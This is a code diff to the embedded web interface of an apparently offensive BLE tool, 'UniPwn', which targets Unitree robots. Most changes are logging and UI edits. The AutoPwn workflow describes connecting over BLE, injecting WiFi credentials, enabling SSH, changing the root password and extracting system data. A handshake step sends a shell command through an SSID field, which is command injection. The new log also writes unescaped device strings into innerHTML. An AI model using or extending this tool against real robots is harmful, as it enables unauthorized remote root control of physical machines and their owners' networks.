@@ -17,6 +17,7 @@ class AsyncWebServerRequest; // Forward declaration for AsyncWebServer
 
 extern std::vector<UnitreeDevice> discoveredDevices;
 extern bool executeCommand(const UnitreeDevice& device, const String& command);
+extern bool performHandshake(const UnitreeDevice& device);
 extern void scanForDevices();
 extern bool buzzerEnabled;
 extern bool ledEnabled;
@@ -251,7 +252,7 @@ const char* webPageHTML = R"rawliteral(
         .target-button.selected {
             border-color: #32ff32;
             background: rgba(50, 255, 50, 0.2);
-            color: #32ff32;
+            color: #0a0a0a; /* dark text for readability on green */
         }
         .target-button .robot-name {
             font-size: 18px;
@@ -260,7 +261,7 @@ const char* webPageHTML = R"rawliteral(
             margin-bottom: 5px;
         }
         .target-button.selected .robot-name {
-            color: #32ff32;
+            color: #0a0a0a; /* dark title on green */
         }
         .target-button .robot-info {
             font-size: 12px;
@@ -371,7 +372,7 @@ const char* webPageHTML = R"rawliteral(
                 
                 <div style="margin-bottom: 25px; padding: 15px; border: 2px solid #ff6b6b; border-radius: 8px; background: rgba(255, 107, 107, 0.1);">
                     <h4 style="color: #ff6b6b; margin-bottom: 10px;">AutoPwn - Complete Exploitation</h4>
-                    <button onclick="startAutoPwn()" id="autoPwnButton" style="background: linear-gradient(45deg, #ff6b6b, #ff8e8e); font-weight: bold; font-size: 16px; padding: 12px 20px;">
+                    <button onclick="try { startAutoPwn(); } catch(e) { console.error('AutoPwn error:', e); alert('AutoPwn error: ' + e.message); }" id="autoPwnButton" style="background: linear-gradient(45deg, #ff6b6b, #ff8e8e); font-weight: bold; font-size: 16px; padding: 12px 20px;">
                         START AUTOPWN
                     </button>
                     <div id="autoPwnStatus" style="margin-top: 10px; min-height: 20px;"></div>
@@ -380,6 +381,10 @@ const char* webPageHTML = R"rawliteral(
                             <div id="progressBar" style="height: 20px; background: linear-gradient(90deg, #32ff32, #ff69b4); width: 0%; transition: width 0.5s;"></div>
                         </div>
                         <div id="progressText" style="text-align: center; margin-top: 5px; color: #ffffff;">0% - Initializing...</div>
+                        <div id="autoPwnSteps" style="margin-top: 15px; max-height: 200px; overflow-y: auto; background: rgba(0,0,0,0.3); border-radius: 5px; padding: 10px;">
+                            <div style="color: #ffffff; font-weight: bold; margin-bottom: 10px;">AutoPwn Steps:</div>
+                            <div id="stepsList" style="font-family: monospace; font-size: 12px;"></div>
+                        </div>
                     </div>
                 </div>
                 
@@ -440,7 +445,7 @@ const char* webPageHTML = R"rawliteral(
         
         <div class="section">
             <h3>Operations Log</h3>
-            <textarea id="logOutput" readonly placeholder="OUI Spy UniPwn operations will be logged here..."></textarea>
+            <div id="logOutput" style="min-height: 300px; font-family: 'Courier New', monospace; font-size: 12px; background: rgba(0, 0, 0, 0.3); color: #00ff00; padding: 10px; border: 1px solid #333; border-radius: 5px; overflow-y: auto; white-space: pre-wrap; max-height: 400px; text-align: left;"></div>
             <div style="text-align: center; margin-top: 15px;">
                 <button onclick="clearLog()">Clear Log</button>
                 <button onclick="exportLog()">Export Log</button>
@@ -458,27 +463,108 @@ const char* webPageHTML = R"rawliteral(
         let autoPwnRunning = false;
         let autoPwnCount = 0;
         let backgroundPoll = null;
+        let discoveredDevices = []; // Store discovered devices for persistence
+        let loggedDevices = new Set(); // Track which devices we've already logged to avoid spam
+        let bleDeviceLogTimes = {};     // Throttle BLE DEVICE logs per address
+        let unitreeLogged = new Set();  // Prevent repeated UNITREE detection logs
+
+        // Comprehensive persistence functions
+        function saveState() {
+            const state = {
+                // Do not persist selected target across sessions
+                exploitStats: exploitStats,
+                // DO NOT persist scan states - they should reset on page refresh
+                discoveredDevices: discoveredDevices,
+                autoPwnRunning: autoPwnRunning,
+                autoPwnCount: autoPwnCount,
+                scanCount: scanCount,
+                timestamp: Date.now()
+            };
+            localStorage.setItem('ouispyState', JSON.stringify(state));
+        }
+
+        function loadState() {
+            const savedState = localStorage.getItem('ouispyState');
+            if (savedState) {
+                try {
+                    const state = JSON.parse(savedState);
+                    
+                    // Restore state
+                    // Do not restore selected target
+                    selectedDevice = null;
+                    exploitStats = state.exploitStats || { successful: 0, failed: 0 };
+                    // DO NOT restore scan states - always start fresh
+                    isScanning = false;
+                    discoveredDevices = state.discoveredDevices || [];
+                    autoPwnRunning = state.autoPwnRunning || false;
+                    autoPwnCount = state.autoPwnCount || 0;
+                    scanCount = state.scanCount || 0;
+                    
+                    // Update UI with restored state
+                    updateUIFromState();
+                    
+                    addLog('STATE RESTORED: All settings and data preserved across refresh', 'success');
+                    return true;
+                } catch (e) {
+                    console.log('Failed to restore state:', e);
+                    return false;
+                }
+            }
+            return false;
+        }
+
+        function updateUIFromState() {
+            // Update exploit stats display
+            document.getElementById('successfulExploits').textContent = exploitStats.successful;
+            document.getElementById('failedExploits').textContent = exploitStats.failed;
+            
+            // Scan button always starts as "Start Scanning" - no persistence
+            document.getElementById('scanButton').textContent = 'Start Scanning';
+            
+            // Restore discovered devices and show them
+            if (discoveredDevices.length > 0) {
+                showTargets(discoveredDevices);
+                document.getElementById('targetsFound').textContent = discoveredDevices.length;
+            }
+            
+            // Restore selected device display
+            if (selectedDevice) {
+                const targetDisplay = document.getElementById('selectedTarget');
+                targetDisplay.innerHTML = 
+                    '<strong>SELECTED TARGET:</strong><br>' +
+                    'Model: ' + selectedDevice.name + '<br>' +
+                    'Address: ' + selectedDevice.address + '<br>' +
+                    'Signal: ' + selectedDevice.rssi + 'dBm<br>' +
+                    'UUID: ' + (selectedDevice.uuid || 'N/A');
+                targetDisplay.style.borderColor = '#32ff32';
+                targetDisplay.style.backgroundColor = 'rgba(50,255,50,0.1)';
+                targetDisplay.style.color = '#32ff32';
+            }
+        }
 
         function addLog(message, type = 'info') {
             const logOutput = document.getElementById('logOutput');
             const timestamp = new Date().toLocaleTimeString();
             let prefix = '[i]';
-            let colorClass = '';
+            let color = '#00ff00'; // Default green
             
-            // Set prefix and color class based on type
-            if (type === 'success') { prefix = '[+]'; colorClass = 'log-success'; }
-            else if (type === 'error') { prefix = '[-]'; colorClass = 'log-error'; }
-            else if (type === 'scan') { prefix = '[*]'; colorClass = 'log-scan'; }
-            else if (type === 'exploit') { prefix = '[>]'; colorClass = 'log-exploit'; }
-            else if (type === 'ble') { prefix = '[BLE]'; colorClass = 'log-ble'; }
-            else if (type === 'bluetooth') { prefix = '[BT]'; colorClass = 'log-bluetooth'; }
-            else if (type === 'detection') { prefix = '[DETECT]'; colorClass = 'log-detection'; }
-            else if (type === 'web') { prefix = '[WEB]'; colorClass = 'log-web'; }
-            else if (type === 'serial') { prefix = '[//]'; colorClass = 'log-serial'; }
-            else if (type === 'target') { prefix = '[TARGET]'; colorClass = 'log-target'; }
-            else if (type === 'uuid') { prefix = '[UUID]'; colorClass = 'log-uuid'; }
+            // Set prefix and color based on type
+            if (type === 'success') { prefix = '[+]'; color = '#32ff32'; }
+            else if (type === 'error') { prefix = '[-]'; color = '#ff3232'; }
+            else if (type === 'scan') { prefix = '[*]'; color = '#ff69b4'; }
+            else if (type === 'exploit') { prefix = '[>]'; color = '#ff6b6b'; }
+            else if (type === 'ble') { prefix = '[BLE]'; color = '#89CFF0'; }
+            else if (type === 'bluetooth') { prefix = '[BT]'; color = '#0080ff'; }
+            else if (type === 'detection') { prefix = '[DETECT]'; color = '#ff1493'; }
+            else if (type === 'web') { prefix = '[WEB]'; color = '#32ff32'; }
+            else if (type === 'serial') { prefix = '[//]'; color = '#89CFF0'; }
+            else if (type === 'target') { prefix = '[TARGET]'; color = '#ffff32'; }
+            else if (type === 'uuid') { prefix = '[UUID]'; color = '#89CFF0'; }
+            else if (type === 'info') { prefix = '[INFO]'; color = '#0080ff'; }
+            else if (type === 'warning') { prefix = '[WARN]'; color = '#ffff32'; }
             
-            logOutput.value += timestamp + ' ' + prefix + ' ' + message + '\\n';
+            const logEntry = `<span style="color: ${color};">${timestamp} ${prefix} ${message}</span><br>`;
+            logOutput.innerHTML += logEntry;
             logOutput.scrollTop = logOutput.scrollHeight;
         }
         
@@ -488,20 +574,71 @@ const char* webPageHTML = R"rawliteral(
             const timestamp = new Date().toLocaleTimeString();
             const logOutput = document.getElementById('logOutput');
             
-            // Clean up ANSI escape codes from serial output
-            const cleanMessage = message.replace(/\\033\\[[0-9;]*m/g, '');
+            // Determine color based on message content
+            let color = '#89CFF0'; // Default baby blue
+            let prefix = '[SERIAL]';
             
-            logOutput.value += timestamp + ' [SERIAL] ' + cleanMessage + '\\n';
+            // Throttle duplicate BLE/UNITREE detections to reduce spam
+            if (message.includes('BLE DEVICE:')) {
+                const match = message.match(/\(([0-9A-Fa-f:]+)\)/);
+                if (match && match[1]) {
+                    const addr = match[1];
+                    const now = Date.now();
+                    if (bleDeviceLogTimes[addr] && (now - bleDeviceLogTimes[addr] < 5000)) {
+                        return; // Skip duplicate within 5s
+                    }
+                    bleDeviceLogTimes[addr] = now;
+                }
+            } else if (message.includes('*** UNITREE TARGET DETECTED ***')) {
+                const match = message.match(/\(([0-9A-Fa-f:]+)\)/);
+                if (match && match[1]) {
+                    const addr = match[1];
+                    if (unitreeLogged.has(addr)) {
+                        return; // Already logged this Unitree device
+                    }
+                    unitreeLogged.add(addr);
+                }
+            }
+
+            if (message.includes('[SUCCESS]')) {
+                color = '#32ff32';
+                prefix = '[SUCCESS]';
+            } else if (message.includes('[ERROR]')) {
+                color = '#ff3232';
+                prefix = '[ERROR]';
+            } else if (message.includes('[INFO]')) {
+                color = '#0080ff';
+                prefix = '[INFO]';
+            } else if (message.includes('[WARN]')) {
+                color = '#ffff32';
+                prefix = '[WARN]';
+            } else if (message.includes('[BLE]')) {
+                color = '#89CFF0';
+                prefix = '[BLE]';
+            } else if (message.includes('[UUID]')) {
+                color = '#89CFF0';
+                prefix = '[UUID]';
+            } else if (message.includes('*** UNITREE TARGET DETECTED ***')) {
+                color = '#ff1493';
+                prefix = '[UNITREE]';
+            } else if (message.includes('BLE DEVICE:')) {
+                color = '#87CEEB';
+                prefix = '[BLE]';
+            }
+            
+            // Add to log with color coding
+            const logEntry = `<span style="color: ${color};">${timestamp} ${prefix} ${message}</span><br>`;
+            logOutput.innerHTML += logEntry;
             logOutput.scrollTop = logOutput.scrollHeight;
         }
 
         function clearLog() {
-            document.getElementById('logOutput').value = '';
+            document.getElementById('logOutput').innerHTML = '';
             addLog('Operations log cleared', 'info');
         }
 
         function exportLog() {
-            const logContent = document.getElementById('logOutput').value;
+            const logContent = document.getElementById('logOutput').innerText;
             const blob = new Blob([logContent], { type: 'text/plain' });
             const url = window.URL.createObjectURL(blob);
             const a = document.createElement('a');
@@ -535,31 +672,29 @@ const char* webPageHTML = R"rawliteral(
         }
 
         function updateTargetsRealtime(devices) {
-            console.log('updateTargetsRealtime called with:', devices);
-            addLog('Real-time update: ' + devices.length + ' devices', 'info');
             
             const deviceList = document.getElementById('deviceList');
             const targetsFound = document.getElementById('targetsFound');
             
             // Update the text area for detailed info
             if (devices.length === 0) {
-                deviceList.value = 'No Unitree robots detected.\\n\\nEnsure targets are:\\n- Powered on and active\\n- Within BLE range (10-30m)\\n- Not in sleep mode\\n\\nSupported models: Go2, G1, H1, B2';
+                deviceList.value = 'No Unitree robots detected.<br><br>Ensure targets are:<br>- Powered on and active<br>- Within BLE range (10-30m)<br>- Not in sleep mode<br><br>Supported models: Go2, G1, H1, B2';
                 targetsFound.textContent = '0';
             } else {
-                let output = 'LIVE TARGETS DETECTED (' + devices.length + '):\\n';
-                output += '='.repeat(50) + '\\n\\n';
+                let output = 'LIVE TARGETS DETECTED (' + devices.length + '):<br>';
+                output += '='.repeat(50) + '<br><br>';
                 
                 devices.forEach((device, index) => {
                     const rssi = device.rssi ? device.rssi + 'dBm' : 'N/A';
                     const model = device.name ? device.name.replace('Unitree_', '') : 'Unknown';
                     const signalStrength = device.rssi > -60 ? 'Excellent' : device.rssi > -70 ? 'Good' : device.rssi > -80 ? 'Fair' : 'Weak';
                     
-                    output += 'TARGET #' + (index + 1) + '\\n';
-                    output += 'Model: ' + model + '\\n';
-                    output += 'Address: ' + device.address + '\\n';
-                    output += 'Signal: ' + rssi + ' (' + signalStrength + ')\\n';
-                    output += 'Status: READY FOR EXPLOITATION\\n';
-                    output += '-'.repeat(40) + '\\n\\n';
+                    output += 'TARGET #' + (index + 1) + '<br>';
+                    output += 'Model: ' + model + '<br>';
+                    output += 'Address: ' + device.address + '<br>';
+                    output += 'Signal: ' + rssi + ' (' + signalStrength + ')<br>';
+                    output += 'Status: READY FOR EXPLOITATION<br>';
+                    output += '-'.repeat(40) + '<br><br>';
                 });
                 
                 deviceList.value = output;
@@ -648,17 +783,45 @@ const char* webPageHTML = R"rawliteral(
             document.getElementById('autoPwnButton').disabled = false;
             document.getElementById('autoPwnButton').textContent = 'START AUTOPWN ON ' + model.toUpperCase();
             document.getElementById('autoPwnButton').style.background = 'linear-gradient(45deg, #32ff32, #69ff69)';
+            document.getElementById('autoPwnButton').style.color = '#0a0a0a';
         }
 
         let scanRunning = false;
         let realtimePoll = null;
+        let serialPoll = null;
+        let scanStartTime = 0;
         
+        // Start serial log polling for real-time operations log updates
+        function startSerialPolling() {
+            if (serialPoll) clearInterval(serialPoll);
+            
+            serialPoll = setInterval(() => {
+                fetch('/serial')
+                    .then(response => response.json())
+                    .then(data => {
+                if (data.serial && data.serial.length > 0) {
+                    // Split by HTML breaks and add each line to the operations log
+                    const lines = data.serial.split('<br>');
+                            lines.forEach(line => {
+                                if (line.trim().length > 0) {
+                                    addSerialLog(line.trim());
+                                }
+                            });
+                        }
+                    })
+                    .catch(error => console.log('Serial poll error:', error));
+            }, 250); // 250ms polling for smooth operations log updates
+        }
+
         function scanDevices() {
             if (scanRunning) return;
             scanRunning = true;
             
             addLog('BLE SCAN INITIATED: Real-time detection active', 'ble');
             document.getElementById('scanStatus').innerHTML = '<span style="color: #32ff32;">Scanning for bots<span id="scanDots">.</span></span>';
+            
+            // Set scan start time for duration tracking
+            scanStartTime = Date.now();
             
             // Start dot animation
             let dotCount = 1;
@@ -684,14 +847,17 @@ const char* webPageHTML = R"rawliteral(
                     .then(response => response.json())
                     .then(data => {
                         if (data.devices && data.devices.length > 0) {
-                            // HOT PINK detection logging with UUIDs
+                            // Only log NEW Unitree detections once; BLE devices throttled in addSerialLog
                             data.devices.forEach((device, index) => {
-                                addLog('ROBOT DETECTED: ' + device.name + ' [' + device.address + '] RSSI: ' + device.rssi + 'dBm', 'detection');
-                                if (device.uuid && device.uuid !== 'N/A') {
-                                    addLog('└─ UUID: ' + device.uuid, 'uuid');
+                                const deviceKey = device.address;
+                                if (!loggedDevices.has(deviceKey)) {
+                                    addLog('ROBOT DETECTED: ' + device.name + ' [' + device.address + '] RSSI: ' + device.rssi + 'dBm', 'detection');
+                                    if (device.uuid && device.uuid !== 'N/A') {
+                                        addLog('└─ UUID: ' + device.uuid, 'uuid');
+                                    }
+                                    loggedDevices.add(deviceKey);
                                 }
                             });
-                            addLog('TOTAL TARGETS: ' + data.devices.length + ' robots ready for exploitation', 'success');
                             showTargets(data.devices);
                             // Update count immediately
                             document.getElementById('scanStatus').innerHTML = '<span style="color: #32ff32;">LIVE: ' + data.devices.length + ' robots detected</span>';
@@ -721,7 +887,9 @@ const char* webPageHTML = R"rawliteral(
         }
         
         function showTargets(devices) {
-            console.log('showTargets called with:', devices);
+            
+            // Store discovered devices for persistence
+            discoveredDevices = devices;
             
             // GUARANTEED target count update
             document.getElementById('targetsFound').textContent = devices.length;
@@ -733,13 +901,10 @@ const char* webPageHTML = R"rawliteral(
             buttons.innerHTML = '';
             
             if (!devices || devices.length === 0) {
-                console.log('No devices - showing no targets message');
                 noMsg.style.display = 'block';
                 buttons.style.display = 'none';
                 return;
             }
-            
-            console.log('Creating buttons for', devices.length, 'devices');
             
             // GUARANTEED button creation
             noMsg.style.display = 'none';
@@ -747,31 +912,39 @@ const char* webPageHTML = R"rawliteral(
             buttons.style.flexDirection = 'column';
             buttons.style.gap = '10px';
             
-            // Create buttons with GUARANTEED visibility
+            // Create buttons with proper CSS classes and selection handling
             devices.forEach((device, index) => {
-                console.log('Creating button for device:', device.name);
+                // Creating button for device
                 
                 const btn = document.createElement('div');
-                btn.className = 'target-button'; // Add class for easier selection
-                btn.style.cssText = 'margin:8px 0; padding:15px; border:3px solid #ff1493; border-radius:8px; background:rgba(255,20,147,0.2); color:#ff1493; cursor:pointer; font-family:monospace; font-weight:bold; font-size:14px; min-height:80px; display:block !important;';
+                btn.className = 'target-button';
+                btn.dataset.deviceAddress = device.address; // Store address for persistence
                 
-                // Hot pink for visibility!
+                // Set initial pink styling
                 const signalColor = device.rssi > -60 ? '#ff1493' : device.rssi > -70 ? '#ff69b4' : device.rssi > -80 ? '#ff1493' : '#dc143c';
                 btn.style.borderColor = signalColor;
                 btn.style.color = signalColor;
                 btn.style.backgroundColor = signalColor + '20';
                 
+                // Check if this device is currently selected (for persistence)
+                if (selectedDevice && selectedDevice.address === device.address) {
+                    btn.classList.add('selected');
+                    btn.style.borderColor = '#32ff32';
+                    btn.style.backgroundColor = 'rgba(50,255,50,0.2)';
+                }
+                
                 btn.onclick = () => {
-                    console.log('Button clicked for:', device.name);
-                    console.log('Device object:', device);
                     
                     // Remove selected class from all buttons first
                     document.querySelectorAll('.target-button').forEach(b => {
-                        b.style.borderColor = '#ff1493';
-                        b.style.backgroundColor = 'rgba(255,20,147,0.2)';
+                        b.classList.remove('selected');
+                        const originalColor = b.dataset.deviceAddress === device.address ? signalColor : '#ff1493';
+                        b.style.borderColor = originalColor;
+                        b.style.backgroundColor = originalColor + '20';
                     });
                     
-                    // Highlight this button as selected
+                    // Add selected class and green styling to clicked button
+                    btn.classList.add('selected');
                     btn.style.borderColor = '#32ff32';
                     btn.style.backgroundColor = 'rgba(50,255,50,0.2)';
                     
@@ -788,30 +961,28 @@ const char* webPageHTML = R"rawliteral(
                     '</div>';
                 
                 buttons.appendChild(btn);
-                console.log('Button added to DOM');
+                // Button added to DOM
             });
             
-            console.log('showTargets completed - buttons created:', buttons.children.length);
-            addLog('TARGETS DISPLAYED: ' + devices.length + ' robots ready', 'success');
+            // showTargets completed
         }
         
         function selectDevice(device) {
-            console.log('=== TARGET SELECTION ===');
-            console.log('selectDevice called with:', device);
-            console.log('Device name:', device.name);
-            console.log('Device address:', device.address);
-            console.log('Device UUID:', device.uuid);
             
             addLog('TARGET SELECTED: ' + device.name + ' [' + device.address + ']', 'detection');
             if (device.uuid && device.uuid !== 'N/A') {
                 addLog('└─ Selected UUID: ' + device.uuid, 'uuid');
             }
             selectedDevice = device;
-            console.log('selectedDevice set to:', selectedDevice);
+            
+            // Persist selection to localStorage for browser refresh survival
+            localStorage.setItem('selectedDevice', JSON.stringify(device));
+            
+            // Save complete state
+            saveState();
             
             // Update selected target display
             const targetDisplay = document.getElementById('selectedTarget');
-            console.log('Updating target display element');
             
             targetDisplay.innerHTML = 
                 '<strong>SELECTED TARGET:</strong><br>' +
@@ -830,6 +1001,7 @@ const char* webPageHTML = R"rawliteral(
             autoPwnBtn.disabled = false;
             autoPwnBtn.textContent = 'START AUTOPWN ON ' + device.name.toUpperCase();
             autoPwnBtn.style.background = 'linear-gradient(45deg, #32ff32, #69ff69)';
+            autoPwnBtn.style.color = '#0a0a0a';
             
             addLog('Target ready for exploitation: ' + device.name, 'success');
             addLog('AutoPwn button enabled for: ' + device.address, 'info');
@@ -846,26 +1018,26 @@ const char* webPageHTML = R"rawliteral(
             const targetsFound = document.getElementById('targetsFound');
             
             if (devices.length === 0) {
-                deviceList.value = 'No Unitree robots detected.\\n\\nEnsure targets are:\\n- Powered on and active\\n- Within BLE range (10-30m)\\n- Not in sleep mode\\n\\nSupported models: Go2, G1, H1, B2';
+                deviceList.value = 'No Unitree robots detected.<br><br>Ensure targets are:<br>- Powered on and active<br>- Within BLE range (10-30m)<br>- Not in sleep mode<br><br>Supported models: Go2, G1, H1, B2';
                 targetsFound.textContent = '0';
                 addLog('Scan completed - no targets found', 'info');
                 return;
             }
             
-            let output = 'DISCOVERED UNITREE ROBOTS (' + devices.length + '):\\n';
-            output += '='.repeat(40) + '\\n\\n';
+            let output = 'DISCOVERED UNITREE ROBOTS (' + devices.length + '):<br>';
+            output += '='.repeat(40) + '<br><br>';
             
             devices.forEach((device, index) => {
                 const rssi = device.rssi ? device.rssi + 'dBm' : 'N/A';
                 const model = device.name ? device.name.replace('Unitree_', '') : 'Unknown';
                 const signalStrength = device.rssi > -60 ? 'Excellent' : device.rssi > -70 ? 'Good' : device.rssi > -80 ? 'Fair' : 'Weak';
                 
-                output += 'TARGET #' + (index + 1) + '\\n';
-                output += 'Address: ' + device.address + '\\n';
-                output += 'Model: ' + model + '\\n';
-                output += 'Signal: ' + rssi + ' (' + signalStrength + ')\\n';
-                output += 'Status: Ready for exploitation\\n';
-                output += '-'.repeat(30) + '\\n\\n';
+                output += 'TARGET #' + (index + 1) + '<br>';
+                output += 'Address: ' + device.address + '<br>';
+                output += 'Model: ' + model + '<br>';
+                output += 'Signal: ' + rssi + ' (' + signalStrength + ')<br>';
+                output += 'Status: Ready for exploitation<br>';
+                output += '-'.repeat(30) + '<br><br>';
             });
             
             output += 'Click a target above to select for AutoPwn';
@@ -879,7 +1051,7 @@ const char* webPageHTML = R"rawliteral(
             // Add click handlers for device selection
             deviceList.onclick = function(e) {
                 // Simple device selection by parsing the clicked area
-                const lines = this.value.split('\\n');
+                const lines = this.value.split('<br>');
                 const clickPos = this.selectionStart;
                 let charCount = 0;
                 let selectedIndex = -1;
@@ -916,6 +1088,7 @@ const char* webPageHTML = R"rawliteral(
                 document.getElementById('scanIndicator').style.display = 'none';
                 document.getElementById('deviceList').value = 'Scanning stopped by user';
                 addLog('CONTINUOUS SCANNING STOPPED by user', 'info');
+                saveState(); // Persist scan state
                 
                 // Clean up any intervals/timeouts
                 if (scanInterval) {
@@ -957,7 +1130,7 @@ const char* webPageHTML = R"rawliteral(
                 dotCount = (dotCount % 3) + 1;
                 const dots = '.'.repeat(dotCount);
                 document.getElementById('scanDots').textContent = dots;
-                document.getElementById('deviceList').value = 'Scanning BLE devices' + dots + '\\nElapsed: ' + elapsed + 's\\nSearching for Unitree robots' + dots;
+                document.getElementById('deviceList').value = 'Scanning BLE devices' + dots + '<br>Elapsed: ' + elapsed + 's<br>Searching for Unitree robots' + dots;
             }, 500);
             
             // Add scan progress logging
@@ -1055,11 +1228,13 @@ const char* webPageHTML = R"rawliteral(
                     document.getElementById('failedExploits').textContent = exploitStats.failed;
                     addLog(command + ' failed on ' + selectedDevice.address + ': ' + data.error, 'error');
                 }
+                saveState(); // Persist exploit stats
             })
             .catch(error => {
                 exploitStats.failed++;
                 document.getElementById('failedExploits').textContent = exploitStats.failed;
                 addLog('Exploit communication error: ' + error.message, 'error');
+                saveState(); // Persist exploit stats
             });
         }
 
@@ -1122,6 +1297,9 @@ const char* webPageHTML = R"rawliteral(
         }
 
         async function startAutoPwn() {
+            console.log('AutoPwn button clicked!');
+            addLog('AutoPwn button clicked - starting diagnostics...', 'info');
+            
             if (autoPwnRunning) {
                 addLog('AutoPwn already running!', 'error');
                 return;
@@ -1129,12 +1307,15 @@ const char* webPageHTML = R"rawliteral(
             
             if (!selectedDevice) {
                 addLog('AUTOPWN FAILED: No target selected!', 'error');
+                addLog('DEBUG: selectedDevice = ' + JSON.stringify(selectedDevice), 'error');
                 document.getElementById('autoPwnStatus').innerHTML = '<span style="color: #ff6b6b;">ERROR: Select a target first</span>';
                 return;
             }
             
+            addLog('AutoPwn proceeding with target: ' + selectedDevice.name, 'info');
+            
             // Bulletproof confirmation dialog
-            if (!confirm('AUTOPWN WARNING: This will attempt full exploitation of ' + selectedDevice.name + ' (' + selectedDevice.address + ')\\n\\nThis will:\\n- Connect via BLE\\n- Inject WiFi credentials\\n- Enable SSH access\\n- Change root password\\n- Extract system info\\n\\nProceed with AutoPwn?')) {
+            if (!confirm('AUTOPWN WARNING: This will attempt full exploitation of ' + selectedDevice.name + ' (' + selectedDevice.address + ')\n\nThis will:\n- Connect via BLE\n- Inject WiFi credentials\n- Enable SSH access\n- Change root password\n- Extract system info\n\nProceed with AutoPwn?')) {
                 addLog('AutoPwn cancelled by user', 'info');
                 return;
             }
@@ -1146,31 +1327,46 @@ const char* webPageHTML = R"rawliteral(
             document.getElementById('autoPwnButton').style.background = 'linear-gradient(45deg, #666666, #888888)';
             document.getElementById('autoPwnProgress').style.display = 'block';
             
+            // Clear previous steps
+            document.getElementById('stepsList').innerHTML = '';
+            
             addLog('=== AUTOPWN #' + autoPwnCount + ' INITIATED ===', 'scan');
             addLog('Target: ' + selectedDevice.name + ' (' + selectedDevice.address + ')', 'info');
             
             const steps = [
-                { name: 'System Check', progress: 10 },
-                { name: 'BLE Connection', progress: 25 },
-                { name: 'Handshake', progress: 40 },
-                { name: 'WiFi Injection', progress: 55 },
-                { name: 'SSH Enable', progress: 70 },
-                { name: 'Root Access', progress: 85 },
+                { name: 'System Check', progress: 15 },
+                { name: 'BLE Connect + Handshake', progress: 30 },
+                { name: 'WiFi Injection', progress: 50 },
+                { name: 'SSH Enable', progress: 65 },
+                { name: 'Root Access', progress: 80 },
                 { name: 'System Extract', progress: 100 }
             ];
+            
+            // Add all steps as pending first
+            for (let i = 0; i < steps.length; i++) {
+                addAutoPwnStep(i + 1, steps[i].name, 'pending');
+            }
             
             try {
                 for (let i = 0; i < steps.length; i++) {
                     const step = steps[i];
+                    const stepNumber = i + 1;
+                    
+                    // Update step to running
+                    updateAutoPwnStep(stepNumber, 'running');
                     updateProgress(step.progress, step.name);
-                    addLog('AutoPwn Step ' + (i+1) + '/7: ' + step.name, 'info');
+                    addLog('AutoPwn Step ' + stepNumber + '/7: ' + step.name, 'info');
                     
                     // Execute the actual step
                     const success = await executeAutoPwnStep(i, step.name);
                     
                     if (!success) {
-                        throw new Error('Step failed: ' + step.name);
+                        updateAutoPwnStep(stepNumber, 'failed', 'Step execution failed');
+                        throw new Error('Step ' + stepNumber + ' (' + step.name + ') failed');
                     }
+                    
+                    // Update step to success
+                    updateAutoPwnStep(stepNumber, 'success');
                     
                     // Wait between steps for stability
                     await sleep(1500);
@@ -1190,15 +1386,26 @@ const char* webPageHTML = R"rawliteral(
                 addLog('Error: ' + error.message, 'error');
                 exploitStats.failed++;
                 document.getElementById('failedExploits').textContent = exploitStats.failed;
+                
+                // Mark any remaining steps as failed
+                for (let i = 0; i < steps.length; i++) {
+                    const stepDiv = document.getElementById('step-' + (i + 1));
+                    if (stepDiv && !stepDiv.innerHTML.includes('[SUCCESS]') && !stepDiv.innerHTML.includes('[FAILED]')) {
+                        updateAutoPwnStep(i + 1, 'failed', 'AutoPwn terminated');
+                    }
+                }
             }
             
             // Reset UI
             autoPwnRunning = false;
             document.getElementById('autoPwnButton').textContent = 'START AUTOPWN';
             document.getElementById('autoPwnButton').style.background = 'linear-gradient(45deg, #ff6b6b, #ff8e8e)';
-            setTimeout(() => {
-                document.getElementById('autoPwnProgress').style.display = 'none';
-            }, 5000);
+            // Keep the progress card visible after failures for troubleshooting
+            if (document.getElementById('progressText').textContent.includes('AUTOPWN COMPLETE')) {
+                setTimeout(() => {
+                    document.getElementById('autoPwnProgress').style.display = 'none';
+                }, 5000);
+            }
         }
         
         async function executeAutoPwnStep(stepIndex, stepName) {
@@ -1221,66 +1428,54 @@ const char* webPageHTML = R"rawliteral(
                             }
                             const statusData = await statusResponse.json();
                             
-                            // Comprehensive system checks
-                            if (!statusData.bleEnabled) throw new Error('BLE is not enabled on device');
-                            if (statusData.freeHeap < 50000) throw new Error('Low memory: ' + statusData.freeHeap + ' bytes');
-                            if (!statusData.wifiConnected && statusData.wifiStatus !== 'AP Mode') {
-                                throw new Error('WiFi not in AP mode');
+                            // Bulletproof checks with graceful fallbacks
+                            const bleOk = (statusData.bleEnabled === true) || (String(statusData.bleStatus).toLowerCase() === 'active');
+                            const heap = Number(statusData.freeHeap || 0);
+                            const wifiMode = String(statusData.wifiStatus || '').toLowerCase();
+                            const wifiConnected = (statusData.wifiConnected === true);
+                            
+                            if (!bleOk) {
+                                throw new Error('BLE inactive');
+                            }
+                            if (heap > 0 && heap < 30000) {
+                                addLog('Warning: Low memory ' + heap + ' bytes - continuing anyway', 'warning');
+                            }
+                            if (!wifiConnected && !(wifiMode.includes('ap') || wifiMode.includes('sta'))) {
+                                addLog('Warning: WiFi state unknown - proceeding', 'warning');
                             }
                             
-                            addLog('System check PASSED - BLE: active, Heap: ' + Math.floor(statusData.freeHeap/1024) + 'KB, WiFi: ' + (statusData.wifiConnected ? 'Connected' : 'AP Mode'), 'success');
+                            addLog('System check PASSED - BLE: ' + (statusData.bleStatus || 'Active') + ', Heap: ' + (heap > 0 ? Math.floor(heap/1024)+'KB' : 'N/A') + ', WiFi: ' + (statusData.wifiStatus || 'Unknown'), 'success');
                             return true;
                             
-                        case 1: // BLE Connection Test
-                            addLog('Testing BLE connection to ' + selectedDevice.address + '...', 'info');
-                            
-                            // Verify device is still in discovered list
-                            const devicesResponse = await fetchWithTimeout('/devices', timeout);
-                            if (!devicesResponse.ok) throw new Error('Failed to get device list');
-                            const devicesData = await devicesResponse.json();
-                            
-                            const deviceFound = devicesData.devices.find(d => d.address === selectedDevice.address);
-                            if (!deviceFound) throw new Error('Target device no longer discoverable');
-                            
-                            addLog('BLE connection test PASSED - Device still discoverable with RSSI: ' + deviceFound.rssi, 'success');
-                            return true;
-                            
-                        case 2: // Handshake
-                            addLog('Initiating BLE handshake protocol...', 'info');
-                            const handshakeResponse = await fetchWithTimeout('/exploit', timeout, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    address: selectedDevice.address,
-                                    command: 'echo "handshake_$(date +%s)"',
-                                    method: 'ssid'
-                                })
